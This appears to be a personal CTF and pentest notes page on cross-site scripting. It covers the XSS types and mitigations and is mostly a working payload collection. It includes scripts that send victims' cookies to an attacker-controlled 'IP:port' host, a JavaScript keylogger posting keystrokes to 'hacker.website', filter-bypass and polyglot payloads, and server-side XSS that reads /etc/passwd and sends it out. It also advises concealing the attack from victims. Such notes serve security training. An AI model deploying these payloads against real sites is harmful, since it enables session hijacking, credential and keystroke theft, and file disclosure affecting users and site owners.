# Cross-site Scripting (XSS)

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![howwebsiteswork](../../../../_badges/thmp/howwebsiteswork.svg)](https://tryhackme.com/room/howwebsiteswork)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day6.svg)](https://tryhackme.com/room/adventofcyber2)
[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xss_injection](../../../../_badges/poat/xss_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
[![xss_filter_evasion](../../../../_badges/owasp/xss_filter_evasion.svg)](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[![dom_based_xss_prevention](../../../../_badges/owasp/dom_based_xss_prevention.svg)](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

<div class="row row-cols-lg-2"><div>

Cross-site Scripting, most commonly called XSS, refers to injecting malicious JavaScript in a web application for it to be executed by other users. For instance, instead of a username, you could use:

```xml!
<script>alert('XSS')</script>
```

And, if the website isn't protected, then anyone consulting your profile will run the script `alert('XSS')` and will see an alert.

‚ö†Ô∏è When using XSS, you want to hide that you executed some XSS in someone's browser. So, you should ensure that no one sees anything suspicious. For instance, add a valid value before the XSS payload.

üí° XSS may be called HTML Injection when using an HTML payload.
</div><div>

Common attack vectors

* üìö Headers <small>(mostly User-Agent)</small>
* üìÑ Forms <small>(Logic flaw: not protecting dropdowns)</small>
* üç™ Cookies

Common mitigations to XSS attacks are:

* üõë [Content-Security-Policy (CSP) header](/operating-systems/networking/protocols/http.md#http-headers-in-web-applications) + secure cookies
* üõ°Ô∏è Input sanitization <small>(`htmlentities`/`addslashes` in PHP)</small>
* üîé Input filtering <small>(`strip_tags` in PHP)</small>
* üî• Web Application Firewall <small>(WAF)</small>
</div></div>

<hr class="sep-both">

## XSS Attacks

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)

<div class="row row-cols-lg-2"><div>

#### Reflected XSS

XSS is reflected when the injected payload is shown on the vulnerable webpage after being rendered by the web server.

üó∫Ô∏è The payload is usually inside the URL. For instance, given the URL: `https://example.com/vuln.php?q=payload` that render `payload` when loaded. We could exploit it using:

```xml!
https://example.com/vuln.php/?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```

üç∑ Users clicking on the link will execute our payload.

<br>

#### Stored XSS

[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

The payload is injected and stored on the server, mostly in a database. At some point, it may be executed by a vulnerable web page.

üó∫Ô∏è Comments, profiles, listings... may be vulnerable.

üç∑ For instance, assuming we use the username `<script>alert('XSS');</script>`, if the profile page is vulnerable, this code will be executed when the server renders our username.
</div><div>

#### Blind XSS

XSS is said to be blind or out-band when we are sending a payload without prior knowledge of where it will be executed.

üó∫Ô∏è Feedback, contact, or support forms. We are targeting the administrators by testing if a contact chanel is vulnerable to any XSS.

üç∑ For instance, we include images in each parameter such as `<img src="IP:PORT/username">` for `username`. If we receive a request to `/xxx` on our grabber, then the payload worked for parameter `xxx`. Otherwise, we try another payload.

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.

<br>

#### DOM-based XSS

[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)

DOM-based XSS occur without the server being aware of them. The client-side JavaScript is the one rendering the payload. For instance, when we use `xxx.innerHTML` or `document.write` <small>(referred to as "a sinker")</small>.

üó∫Ô∏è Mostly, javascript-based applications.

üç∑ If an application parsing anchors `URL#xxx` and displays a message, it may be exploited with payloads like `<img src="" onerror=print()>`. Most functions don't allow the `script` tag.
</div></div>


<hr class="sep-both">

## XSS payloads

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)

<table class="table table-bordered border-dark table-dark bg-transparent mt-4">
<thead>
<tr><th>Case</th><th>HTML</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></td></tr>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;script&gt;console.log('XSS')&lt;/script&gt;</code></td></tr>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;script&gt;print()&lt;/script&gt;</code></td></tr>

<tr><td>PoC</td><td><code>&lt;p&gt;here&lt;/p&gt;</code></td><td><code>&lt;plaintext&gt;</code></td></tr>

<tr><td>Boxed attribute</td><td><code>&lt;input value="here"&gt;</code></td><td><code>">MaliciousCodeHere</code></td></tr>

<tr><td>Unboxed attribute</td><td><code>&lt;input value=here&gt;</code></td><td><code>>MaliciousCodeHere</code></td></tr>

<tr><td>Wrapped</td><td><code>&lt;textarea>here&lt;/textarea&gt;</code></td><td><code>&lt;/textarea&gt;MaliciousCodeHere</code></td></tr>

<tr><td>JavaScript</td><td><code>xxx.innerHTML = 'here';</code></td><td><code>';MaliciousCodeHere;//</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onload="maliciousCodeHere"</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onerror="maliciousCodeHere"</code></td></tr>
</tbody></table>

üìö Use `window.origin` when dealing with an iframe.

<hr class="sep-both">

## XSS 'malicious code'

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

<div class="row row-cols-lg-2"><div>

Common "malicious code" used in PoC payloads are 

* `alert(...)`: show an alert with a message
* `console.log(...)`: print a message in the console

Real examples of malicious code can be found at [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all).

#### Session hijacking/Cookie Stealing

[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![csp_bypass_nonce](../../../../_badges/rootme/web_client/csp_bypass_nonce.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)

Anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold üí∞, because with them, we can bypass verifications such as 2FA and access someone else account of insecure webservers.

```html!
<script>fetch('http://IP:port/?cookie=' + btoa(document.cookie));</script>
<script>fetch('http://IP:port', { method: 'POST', mode: 'no-cors', credentials: 'include', body: btoa(document.cookie) });</script>
<script>new Image().src = "http://IP:port/?cookie="+btoa(document.cookie);</script>
<script>let imageElement = document.createElement("img"); imageElement.src = "http://IP:port/?cookie="+btoa(document.cookie); document.body.appendChild(imageElement)</script>
<script>document.location="http://IP:port/?cookie="+document.cookie;</script>
```

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.

üìö Refer to [CSRF](csrf.md) for attacks using a form.
</div><div>

#### Keylogger

Sends keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

```html!
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```

#### Other Attacks

* Defacing websites
* Injecting a login form to access the original website
</div></div>

<hr class="sep-both">

## XSS filter bypass

<div class="row row-cols-lg-2"><div>

#### HTML Tags/Attributes Filtering Bypass

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![csp_bypass_inline_code](../../../../_badges/rootme/web_client/csp_bypass_inline_code.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)

Many filtering functions will only process the text once. If we know that a specific pattern or keyword is filtered, we can use a payload that works after being filtered. If there is a filter removing `<script>`:

* Payload: `<s<script>cript>alert('XSS');</s<script>cript>`
* Payload Filtered: `<script>alert('XSS');</script>`

You can also try variants if the filter is case-sensitive:

```html!
<scIpT>alert('XSS');</scIpT> <!-- script filtered -->
<img src="" ONERROR="alert('XSS')" /> <!-- onerror filtered -->
```

#### JavaScript Word Filtering Bypass

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![csp_bypass_nonce](../../../../_badges/rootme/web_client/csp_bypass_nonce.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)

If we are still within an `HTML attribute`, we can use unicode:

```html!
<img src="NOT_FOUND" onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;('XSS')>
```

Otherwise, if we are either within a `script` or within an `HTML attribute`:

```js!
eval('aler'+'t')('XSS')   // Eval Bypass (with/without '+')           
eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))
eval(atob('YWxlcnQoJ1hTUycp'))
\u0061lert('XSS')         // Unicode Bypass
```

The `window` and `document` variables may have been filtered.

```js!
window.document == document == window['document']
window == self == this == top
document["location"], location.assign(""), location = "", location.replace(...)
```
</div><div>

#### XSS Polygots Filtering Bypass

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

Polygot are complex payloads designed to bypass many filter:

```js!
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

<br>

#### XSS Character Filtering Bypass

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)

Character filtering can be really hard to bypass.

* If `<` and `>` are filtered, we may still be able use DOM attributes such as `onerror`, `onload`, etc.

* If `;` is filtered in DOM-based, we can use `\n`==`%0A`

* If either `'` or `"` is filtered, try the other one.

* If `.` is filtered, we can use `[]`. For instance, `document.location` and `document["location"]` are exactly the same.

<br>

#### Additional Notes For Filtering Bypass

[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![csp_bypass_inline_code](../../../../_badges/rootme/web_client/csp_bypass_inline_code.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)

* If `https://[...]` is filtered, we can use `//[...]` while unicode and other encodings may also do the job

* If we don't use `btoa(...)`, maybe we would use `"payload".replace(/<[^>]+>|\n|\t/g, '')`

<details class="details-n">
<summary>Payload Encoding Using JavaScript</summary>

**Usage**: convert text for usage with `String.fromCharCode`.

```js!
// stringToCharCodeArray("alert('XSS')")
function stringToCharCodeArray(str) {
  var charCodes = [];
  for (var i = 0; i < str.length; i++) {
    charCodes.push(str.charCodeAt(i));
  }
  return charCodes.join(",");
}
```

**Usage**: convert string to an unicode-encoded string.

```js!
// console.log(convertToUnicode("alert('XSS')")); 
// \u0061\u006c\u0065\u0072\u0074('\u0058\u0053\u0053')
function convertToUnicode(str) {
  var unicodeStr = "";
  for (var i = 0; i < str.length; i++) {
    let char = str[i];
    if (['(', ')', "'"].includes(char)) {
        unicodeStr += char;
    } else {
        unicodeStr += "\\u" +  str.charCodeAt(i).toString(16).padStart(4, '0');
    }
  }
  return unicodeStr
}
```

**Usage**: convert to HTML unicode.

```js!
function encodeString(str) {
    var encoded = '';
    for (var i = 0; i < str.length; i++) {
        encoded += '&#' + str.charCodeAt(i) + ';';
    }
    return encoded;
}
```
</details>
</div></div>

<hr class="sep-both">

## XSS Tools ‚öíÔ∏è

<div class="row row-cols-lg-2"><div>

#### XSStrike

[XSStrike](https://github.com/s0md3v/XSStrike) <small>(12.5k ‚≠ê, 2022 ‚ò†Ô∏è)</small> is a popular XSS tool that is still working as of 2024 while it's not maintained.

```shell!
$ cd /opt
$ sudo git clone https://github.com/s0md3v/XSStrike.git
$ sudo chmod +x XSStrike/xsstrike.py
$ sudo ln -s /opt/XSStrike/xsstrike.py /usr/local/bin/xsstrike
$ xsstrike -u 'URL?param=vuln'
```

The tool will process the URL and the parameter to see if any are vulnerable. Press 'Enter' until you find one that works. Carefully read the payload when testing, e.g. 'mouse over,' or stuff like that.
</div><div>

#### Other tools

There are a lot of them, but they are all abandoned. If seems using web scanners such as Burp, Zaproxy, or Nessus is more common.

* [xsser](https://github.com/epsylon/xsser) <small>(1.0k ‚≠ê, 2022 ü™¶Ô∏è)</small>
* [xsscrapy](https://github.com/DanMcInerney/xsscrapy) <small>(1.6k ‚≠ê, 2022 ü™¶Ô∏è)</small>
* [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) <small>(0.5k ‚≠ê, 2021 ü™¶)</small>
* [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) <small>(1.4k ‚≠ê, 2019 ü™¶)</small> + [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express) <small>(1.3k ‚≠ê, 2021 ü™¶)</small>
* [Zeus-Scanner](https://github.com/Ekultek/Zeus-Scanner) <small>(0.9k ‚≠ê, 2019 ü™¶)</small>
* [whitewidow](https://github.com/WhitewidowScanner/whitewidow) <small>(1.0k ‚≠ê, 2018 ü™¶)</small>
</div></div>

<hr class="sep-both">

## Server-Side XSS

[![server_side_xss_dynamic_pdf](../../../../_badges/hacktricks/pentesting_web/xss_cross_site_scripting/server_side_xss_dynamic_pdf.svg)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)
[![xss_server_side](../../../../_badges/rootme/web_server/xss_server_side.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

<div class="row row-cols-lg-2"><div>

If a website is creating a PDF using user-input, such as using [wkhtmltopdf](https://wkhtmltopdf.org/downloads.html), we may be able to execute JavaScript code.

```html!
<script>document.write('poc')</script>
<img src="http://IP:port/img"/>
```

Refer to [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch the response during CTFs.
</div><div>

We can use it to read files such as `/etc/passwd`:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){document.write(this.responseText)};xhzeem.onerror=function(){document.write('failed!')};xhzeem.open("GET","file:///etc/passwd");xhzeem.send();</script>
```

For Blind Server-Side XSS, we can use:

```html!
<script>xhzeem=new XMLHttpRequest();xhzeem.onload=function(){xhzxfil=new XMLHttpRequest();xhzxfil.open("GET",'http://IP:port/?data='+btoa(this.response),true);xhzxfil.send()};xhzeem.open("GET","file:///etc/passwd",true);xhzeem.send();</script> ;
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Place to check: forms, headers
* `"><script src=//www.example.com/exploit.js></script>`: no http/https?
</div><div>
</div></div>